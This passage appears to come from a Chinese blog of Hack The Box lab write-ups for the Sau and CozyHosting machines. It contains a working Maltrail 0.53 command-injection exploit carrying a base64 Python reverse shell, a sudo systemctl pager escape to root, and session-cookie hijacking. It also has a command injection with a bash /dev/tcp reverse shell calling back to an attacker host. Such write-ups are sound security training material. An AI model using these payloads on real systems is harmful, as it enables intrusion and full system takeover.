<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在终端 curl 1 </span></span><br><span class="line">curl -X POST -lk -d <span class="string">&#x27;&#123;&quot;forward_url&quot;: &quot;http://127.0.0.1:80/login&quot;,&quot;proxy_response&quot;: true,&quot;insecure_tls&quot;: false,&quot;expand_path&quot;: true,&quot;capacity&quot;: 250&#125;&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> http://10.10.11.224:55555/api/baskets/oltestingg -v </span><br><span class="line">Note: Unnecessary use of -X or --request, POST is already inferred.</span><br><span class="line">*   Trying 10.10.11.224:55555...</span><br><span class="line">* Connected to 10.10.11.224 (10.10.11.224) port 55555 (<span class="comment">#0)</span></span><br><span class="line">&gt; POST /api/baskets/oltestingg HTTP/1.1</span><br><span class="line">&gt; Host: 10.10.11.224:55555</span><br><span class="line">&gt; User-Agent: curl/7.85.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Type: application/json</span><br><span class="line">&gt; Content-Length: 125</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 201 Created</span><br><span class="line">&lt; Content-Type: application/json; charset=UTF-8</span><br><span class="line">&lt; Date: Wed, 04 Oct 2023 13:23:53 GMT</span><br><span class="line">&lt; Content-Length: 56</span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host 10.10.11.224 left intact</span></span><br><span class="line">&#123;<span class="string">&quot;token&quot;</span>:<span class="string">&quot;h8_75epaH1_xl-7tU495AHAxn6o5sr3QvYdTCpLyFGPA&quot;</span>&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">#curl 2</span></span><br><span class="line">curl http://10.10.11.224:55555/oltestingg -v</span><br><span class="line"></span><br><span class="line">*   Trying 10.10.11.224:55555...</span><br><span class="line">* Connected to 10.10.11.224 (10.10.11.224) port 55555 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /oltestingg HTTP/1.1</span><br><span class="line">&gt; Host: 10.10.11.224:55555</span><br><span class="line">&gt; User-Agent: curl/7.85.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 401 Unauthorized</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Content-Type: text/plain</span><br><span class="line">&lt; Date: Wed, 04 Oct 2023 13:24:25 GMT</span><br><span class="line">&lt; Server: Maltrail/0.53</span><br><span class="line">&lt; Content-Length: 12</span><br><span class="line">&lt; </span><br><span class="line">* Closing connection 0</span><br><span class="line">Login failed   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>“forward_url” : tells server where to forward the client’s request; so the server is making a request on client’s behalf.</li>
<li>“proxy_response” : tells server if the client wants to know what info it got back from the request.</li>
<li>“insecure_tls” : if you didn’t want server to verify CA on SSL cert, like if it was a self-signed cert.</li>
</ul>
</blockquote>
<p>上面发现了个服务 <code>Maltrail/0.53</code></p>
<p>谷歌一下，有现成的poc</p>
<p>脚本内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys;</span><br><span class="line"><span class="keyword">import</span> os;</span><br><span class="line"><span class="keyword">import</span> base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">	listening_IP = <span class="literal">None</span></span><br><span class="line">	listening_PORT = <span class="literal">None</span></span><br><span class="line">	target_URL = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Error. Needs listening IP, PORT and target URL.&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span>(-<span class="number">1</span>)</span><br><span class="line">	</span><br><span class="line">	listening_IP = sys.argv[<span class="number">1</span>]</span><br><span class="line">	listening_PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line">	target_URL = sys.argv[<span class="number">3</span>]</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Running exploit on &quot;</span> + <span class="built_in">str</span>(target_URL))</span><br><span class="line">	curl_cmd(listening_IP, listening_PORT, target_URL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl_cmd</span>(<span class="params">my_ip, my_port, target_url</span>):</span><br><span class="line">	payload = <span class="string">f&#x27;python3 -c \&#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="subst">&#123;my_ip&#125;</span>&quot;,<span class="subst">&#123;my_port&#125;</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)\&#x27;&#x27;</span></span><br><span class="line">	encoded_payload = base64.b64encode(payload.encode()).decode()  <span class="comment"># encode the payload in Base64</span></span><br><span class="line">	command = <span class="string">f&quot;curl &#x27;<span class="subst">&#123;target_url&#125;</span>&#x27; --data &#x27;username=;`echo+\&quot;<span class="subst">&#123;encoded_payload&#125;</span>\&quot;+|+base64+-d+|+sh`&#x27;&quot;</span></span><br><span class="line">	os.system(command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004213919582.png"></p>
<p>那找啊找啊找</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">id</span><br><span class="line">uid=1001(puma) gid=1001(puma) groups=1001(puma)</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">pwd</span></span></span><br><span class="line">pwd</span><br><span class="line">/opt/maltrail</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ..</span></span><br><span class="line">cd ..</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ls</span><br><span class="line">maltrail</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ..</span></span><br><span class="line">cd ..</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ls</span><br><span class="line">bin   data  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  vagrant</span><br><span class="line">boot  dev   home  lib32  libx32  media       opt  root  sbin  sys  usr  var</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">pwd</span></span></span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> usr</span></span><br><span class="line">cd usr</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -a</span></span><br><span class="line">ls -a</span><br><span class="line">.   bin    include  lib32  libexec  local  share</span><br><span class="line">..  games  lib      lib64  libx32   sbin   src</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whereis user.txt</span></span><br><span class="line">whereis user.txt</span><br><span class="line">user:</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pw</span></span><br><span class="line">pw</span><br><span class="line">/bin/sh: 30: pw: not found</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">pwd</span></span></span><br><span class="line">pwd</span><br><span class="line">/usr</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ..</span></span><br><span class="line">cd ..</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> root</span></span><br><span class="line">cd root</span><br><span class="line">/bin/sh: 33: cd: can&#x27;t cd to root</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> home</span></span><br><span class="line">cd home</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ls</span><br><span class="line">puma</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> puma</span></span><br><span class="line">cd puma</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -a</span></span><br><span class="line">ls -a</span><br><span class="line">.   .bash_history  .bashrc  .gnupg    .viminfo    user.txt</span><br><span class="line">..  .bash_logout   .cache   .profile  .wget-hsts</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> user.txt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="root-1"><a href="#root-1" class="headerlink" title="root"></a>root</h3><p>sudo提权</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo -l</span></span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for puma on sau:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User puma may run the following commands on sau:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行这个命令</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo /usr/bin/systemctl status trail.service</span></span><br><span class="line">sudo /usr/bin/systemctl status trail.service</span><br><span class="line">WARNING: terminal is not fully functional</span><br><span class="line">-  (press RETURN)</span><br><span class="line">● trail.service - Maltrail. Server of malicious traffic detection system</span><br><span class="line">     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:&gt;</span><br><span class="line">     Active: active (running) since Wed 2023-10-04 05:43:01 UTC; 8h ago</span><br><span class="line">       Docs: https://github.com/stamparm/maltrail#readme</span><br><span class="line">             https://github.com/stamparm/maltrail/wiki</span><br><span class="line">   Main PID: 895 (python3)</span><br><span class="line">      Tasks: 32 (limit: 4662)</span><br><span class="line">     Memory: 48.8M</span><br><span class="line">     CGroup: /system.slice/trail.service</span><br><span class="line">             ├─  895 /usr/bin/python3 server.py</span><br><span class="line">             ├─ 1206 /bin/sh -c logger -p auth.info -t &quot;maltrail[895]&quot; &quot;Failed &gt;</span><br><span class="line">             ├─ 1207 /bin/sh -c logger -p auth.info -t &quot;maltrail[895]&quot; &quot;Failed &gt;</span><br><span class="line">             ├─ 1210 sh</span><br><span class="line">             ├─ 1211 python3 -c import socket,os,pty;s=socket.socket(socket.AF_&gt;</span><br><span class="line">             ├─ 1212 /bin/sh</span><br><span class="line">             ├─ 1215 sudo systemctl status trail.service</span><br><span class="line">             ├─ 1217 systemctl status trail.service</span><br><span class="line">             ├─ 1218 pager</span><br><span class="line">             ├─ 6037 sh -c /bin/bash -c sh</span><br><span class="line">             ├─ 6038 sh</span><br><span class="line">             ├─42255 /bin/sh -c logger -p auth.info -t &quot;maltrail[895]&quot; &quot;Failed &gt;</span><br><span class="line">             ├─42256 /bin/sh -c logger -p auth.info -t &quot;maltrail[895]&quot; &quot;Failed &gt;</span><br><span class="line">             ├─42259 sh</span><br><span class="line">lines 1-23</span><br><span class="line">             ├─42260 python3 -c import socket,os,pty;s=socket.socket(socket.AF_&gt;</span><br><span class="line">lines 2-24</span><br><span class="line">             ├─42261 /bin/sh</span><br><span class="line">lines 3-25</span><br><span class="line">             ├─42268 sudo systemctl status trail.service</span><br><span class="line">lines 4-26</span><br><span class="line">             ├─42269 systemctl status trail.service</span><br><span class="line">lines 5-27</span><br><span class="line">             ├─42270 pager</span><br><span class="line">lines 6-28</span><br><span class="line">             ├─42271 sh -c /bin/bash -c sh</span><br><span class="line">lines 7-29</span><br><span class="line">             ├─42272 sh</span><br><span class="line">lines 8-30</span><br><span class="line">             ├─42421 /bin/sh -c logger -p auth.info -t &quot;maltrail[895]&quot; &quot;Failed &gt;</span><br><span class="line">lines 9-31</span><br><span class="line">             ├─42422 /bin/sh -c logger -p auth.info -t &quot;maltrail[895]&quot; &quot;Failed &gt;</span><br><span class="line">lines 10-32</span><br><span class="line">             ├─42425 sh</span><br><span class="line">lines 11-33</span><br><span class="line">             ├─42426 python3 -c import socket,os,pty;s=socket.socket(socket.AF_&gt;</span><br><span class="line">lines 12-34</span><br><span class="line">             ├─42427 /bin/sh</span><br><span class="line">lines 13-35</span><br><span class="line">             ├─42453 sudo /usr/bin/systemctl status trail.service</span><br><span class="line">lines 14-36id</span><br><span class="line">lines 14-36             ├─42454 /usr/bin/systemctl status trail.service</span><br><span class="line">             └─42455 pager</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">lines 27-49!sh #</span><br><span class="line">!sshh!sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">pwd</span></span> </span><br><span class="line">pwd</span><br><span class="line">/home/puma</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> ..</span></span><br><span class="line">cd ..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> ..</span></span><br><span class="line">cd ..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ls</span><br><span class="line">bin   data  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  vagrant</span><br><span class="line">boot  dev   home  lib32  libx32  media       opt  root  sbin  sys  usr  var</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> root</span></span><br><span class="line">cd root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ls</span><br><span class="line">go  root.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>ssrf漏洞利用</p>
<p>curl工具发送http post请求</p>
<p>现有的服务漏洞exp利用</p>
<p>使用<code>curl</code>工具进行HTTP POST请求的命令</p>
<ul>
<li><code>-X POST</code>: 这是<code>curl</code>命令的选项之一，指定要发送的HTTP请求方法。在这里，它指定了要发送一个HTTP POST请求。</li>
<li><code>-lk</code>: 这是两个不同的选项的组合：<ul>
<li><code>-l</code>: 表示<code>curl</code>应该跟随重定向。如果服务器返回一个重定向响应，<code>curl</code>将会自动跟随并获取重定向后的响应。</li>
<li><code>-k</code>: 表示<code>curl</code>应该忽略SSL证书验证，允许与不安全的HTTPS服务器通信。这在测试和调试时可能有用，但在生产环境中应慎用。</li>
</ul>
</li>
<li><code>-d &#39;&#123;&quot;forward_url&quot;: &quot;http://127.0.0.1:80/login&quot;,&quot;proxy_response&quot;: true,&quot;insecure_tls&quot;: false,&quot;expand_path&quot;: true,&quot;capacity&quot;: 250&#125;&#39;</code>: 这是<code>curl</code>命令的另一个选项，用于指定HTTP POST请求的数据体。在这里，它将一个JSON对象作为数据体发送给目标服务器。JSON对象包含了一些键值对，这些数据将作为请求的一部分发送给目标服务器。</li>
<li><code>-H &#39;Content-Type: application/json&#39;</code>: 这是<code>curl</code>命令的选项之一，用于设置HTTP请求头。在这里，它设置了<code>Content-Type</code>头，指定请求的数据体是JSON格式的。</li>
</ul>
<p>总的来说，这个<code>curl</code>命令的目的是发送一个HTTP POST请求到<code>http://127.0.0.1:80/login</code>这个URL，并在请求中包含了一个JSON格式的数据体。它还指定了一些选项，如跟随重定向和忽略SSL证书验证等。这个请求的具体行为和目的取决于服务器如何处理这个请求以及JSON数据体中包含的信息</p>
<h2 id="7-cozyhosting"><a href="#7-cozyhosting" class="headerlink" title="7.cozyhosting"></a>7.cozyhosting</h2><h3 id="user-2"><a href="#user-2" class="headerlink" title="user"></a>user</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap端口</span></span><br><span class="line">nmap -sT --min-rate 10000 -p- 10.10.11.230  </span><br><span class="line"></span><br><span class="line">Warning: 10.10.11.230 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.11.230</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 39411 closed tcp ports (conn-refused), 26120 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">4321/tcp open  rwhois</span><br><span class="line">6666/tcp open  irc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap 详细</span></span><br><span class="line">nmap -sT -sV -sC -O -p22,80,4321,6666 10.10.11.230 </span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)</span><br><span class="line">|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)</span><br><span class="line">80/tcp   open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://cozyhosting.htb</span><br><span class="line">4321/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)</span><br><span class="line">|_http-title: Directory listing for /</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/3.10.12</span><br><span class="line">6666/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)</span><br><span class="line">|_http-title: Directory listing for /</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/3.10.12</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>vim &#x2F;etc&#x2F;hosts 添加下域名</p>
<p>访问域名，是cozy hosting的页面</p>
<p>登录用户名和密码，emmm，不知道</p>
<p>谷歌一下 <code>cozy hosting default credentials</code></p>
<p>好像没有哦，我也尝试了bp，好像也没有注入的地方</p>
<p>那试试路径爆破吧</p>
<p>dirb没跑出来啊，字典不行</p>
<p>wp，跑出来了个  <code>actuator</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004223103423.png"></p>
<p>访问这个的话，<code>http://cozyhosting.htb/actuator/sessions</code></p>
<p>是有个用户名为：<code>kanderson</code></p>
<p>访问 <code>http://cozyhosting.htb/actuator/mappings</code></p>
<p>发现了一些新路径，如</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004225018121.png"></p>
<p>我试了好几个sessions里和kanderson有关的那个cookie</p>
<p>(最好是只有一个kanderson的时候，其余都是未授权，这样成功率高些)</p>
<p>E645E749002BB1BE624F436DFD942FC0</p>
<p>就从登录开始，将Cookie换成kanderson的那个</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004230957083.png"></p>
<p>一直将cookie替换成新的那个，直到请求路径它自动请求到了&#x2F;admin</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004231026256.png"></p>
<p>进来了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004231203412.png"></p>
<p>底部有这个</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004231308596.png"></p>
<p>随便填一些值，抓个包</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004231354153.png"></p>
<p>去掉username的值呢？</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004231431536.png"></p>
<p>然后嘞</p>
<p>host&#x3D;127.0.0.1&amp;username&#x3D;whoami</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004232156093.png"></p>
<p><code>host=127.0.0.1&amp;username=;kerbos</code></p>
<p>响应包内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...]/bin/bash: line 1: kerbos@127.0.0.1: command not found</span><br></pre></td></tr></table></figure>

<p>要是这样搞的话，</p>
<p>我攻击机做一次服务器，让目标机访问攻击机呗</p>
<p>kali写一个文件，中间要有@，那就叫 1@1吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># vim 1.1       </span></span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat 1.1                                     </span></span><br><span class="line">bash -c <span class="string">&quot;bash -i&gt;&amp; /dev/tcp/10.10.14.53/7777 0&amp;&gt;1&quot;</span> <span class="comment">#这里写错了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听</span></span><br><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li><code>/bin/bash -i</code>: starts an interactive bash shell. In an interactive shell, you can type commands and receive output interactively.</li>
<li><code>&gt;&amp; /dev/tcp/10.10.16.68/9991</code>: redirects both (<code>stdout</code>, file descriptor 1) and (<code>stderr</code>, file descriptor 2) to a network socket. The output of the bash shell is sent to our local netcat listening IP and listening PORT.</li>
<li><code>0&gt;&amp;1</code>: redirects (<code>stdin</code>, file descriptor 0) to the same network socket as (<code>stdout</code>, file descriptor 1). This ensures that any input sent to the shell (e.g., commands typed by the attacker) is also sent over the network to the remote attacker.</li>
</ol>
</blockquote>
<p>这里python3快速搭建一个服务器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">5555</span></span><br></pre></td></tr></table></figure>

<p>来，bp里构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=127.0.0.1&amp;username=;||http://10.10.14.53:5555/1@1</span><br></pre></td></tr></table></figure>

<p>响应包显示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`||&#x27;/bin/bash: -c: line 1: `ssh -o ConnectTimeout=1 ;||http://10.10.14.53:5555/1@1@127.0.0.1&#x27;</span><br></pre></td></tr></table></figure>

